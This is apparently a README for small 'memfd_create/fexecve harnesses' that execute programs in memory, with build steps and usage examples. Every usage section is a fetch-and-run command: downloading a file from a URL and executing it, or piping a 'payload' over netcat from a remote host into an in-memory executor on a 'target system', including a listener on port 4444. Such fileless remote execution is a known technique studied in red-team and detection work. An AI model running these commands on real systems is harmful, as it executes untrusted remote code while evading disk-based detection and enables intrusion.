# memfd_create/fexecve harnesses
These exceute programs in memory. The programs can be delivered via stdin or
from an URL.

## Building
This has only been tested on Ubuntu 18.04.
```
sudo apt install libcurl4-openssl-dev
make
```

## From URL
This will download _file_ from _host_, and execute it with _args_.

```
./fexecve-from-url http://host/file args
```

## Using netcat (method1)
This connects to _host_ on _port_ to receive the payload.

* On system serving the payload:
```
cat file | nc -lp port
```

* On target system:
```
nc host port | ./fexecve-from-stdin args
```

## Using netcat (method2)
This listens for incoming connections on port 4444 to receive the payload.

* On target system:
```
nc -lp 4444 | ./fexecve-from-stdin args
```

* Send a payload:
```
cat file | nc target 4444
```

